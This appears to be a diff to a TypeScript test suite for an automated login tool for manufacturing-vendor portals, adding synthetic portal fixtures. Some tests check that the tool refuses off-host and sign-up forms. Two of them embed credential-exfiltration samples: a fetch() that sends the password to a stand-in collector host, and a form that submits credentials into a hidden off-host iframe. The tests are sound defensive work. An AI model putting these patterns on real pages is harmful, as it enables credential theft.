@@ -162,6 +162,25 @@ function weergSite(): Site {
   };
 }
 
+/** Email first, then password, on a sign-in route with no form element at all. */
+function formlessTwoStepSite(): Site {
+  const page = `<!doctype html><title>Geomiq fixture</title><body><main id="main">
+      <label>Email <input type="email" id="email"></label><button type="button" id="next">Next</button>
+    </main><script>
+      if (${SIGNED_IN}) location.replace("/");
+      document.getElementById("next").addEventListener("click", () => {
+        const email = document.getElementById("email").value;
+        document.getElementById("main").innerHTML = '<label>Password <input type="password" id="password"></label><button type="button" id="go">Log in</button>';
+        document.getElementById("go").addEventListener("click", async () => {
+          const body = new URLSearchParams({ email, password: document.getElementById("password").value });
+          const response = await fetch("/api/login", { method: "POST", body });
+          if (response.ok) { ${SIGN_IN_COOKIE} location.href = "/"; }
+        });
+      });
+    </script></body>`;
+  return { ...geomiqSite(), "GET app.geomiq.com/login": html(page) };
+}
+
 /** Email first, then password on a second step. */
 function geomiqSite(): Site {
   const root = `<!doctype html><title>Geomiq fixture</title><body><main id="main"></main><script>
@@ -408,6 +427,45 @@ describe("login:vendors against synthetic portals", () => {
     const { result, observed } = await runLogin("weerg", menuLoginSite());
     expect(result.outcome).toBe("stopped");
     expect(observed.posts).toEqual([]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("stops before typing into a form that submits by GET into a frame on another host", async () => {
+    const form = `'<iframe name="sink" style="width:10px;height:10px"></iframe><form id="login" target="sink" method="get" action="https://collector.offhost-fixture.test/c">'
+      + '<input type="email" name="email" autocomplete="username"><input type="password" name="password" autocomplete="current-password">'
+      + '<button type="submit">Sign in</button></form>'`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form })));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:form_submits_off_host" });
+    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("aborts a page script that puts the password in an off-host URL", async () => {
+    const leak = `fetch("https://collector.offhost-fixture.test/c?p=" + encodeURIComponent(new FormData(login).get("password"))).catch(() => {});`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ onSubmit: leak })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.requests.some((request) => request.includes("offhost-fixture.test"))).toBe(false);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("never submits a create-account form behind a generic Continue button", async () => {
+    const signUp = `'<form id="login" data-endpoint="/api/register"><h2>Create account</h2><input type="email" name="email">'
+      + '<input type="password" name="password"><button type="submit">Continue</button></form>'`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: signUp })));
+    expect(result).toMatchObject({ outcome: "stopped", reason: "unknown_page:registration_or_reset_form" });
+    expect(observed.posts).toEqual([]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("skips a new-password field even when the sign-in field carries no autocomplete hint", async () => {
+    const both = `'<form id="signup" data-endpoint="/api/register"><input type="email" name="email"><input type="password" name="password" autocomplete="new-password">'
+      + '<button type="submit">Create account</button></form>'
+      + '<form id="login"><input type="email" name="email"><input type="password" name="password"><button type="submit">Sign in</button></form>'`;
+    const { result, observed } = await runLogin("quickparts", quickpartsSite(quickpartsApp({ form: both })));
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.posts.map((post) => post.target)).toEqual(["quickquote.quickparts.com/api/login"]);
+  }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
+
+  it("handles an email-first sign-in with no form element on a sign-in route", async () => {
+    const { result, observed } = await runLogin("geomiq", formlessTwoStepSite());
+    expect(result).toMatchObject({ outcome: "saved" });
+    expect(observed.posts.map((post) => post.target)).toEqual(["app.geomiq.com/api/login"]);
   }, PRODUCTION_PORTAL_BROWSER_TIMEOUT_MS);
 
   it("handles an email-first, password-second sign-in", async () => {
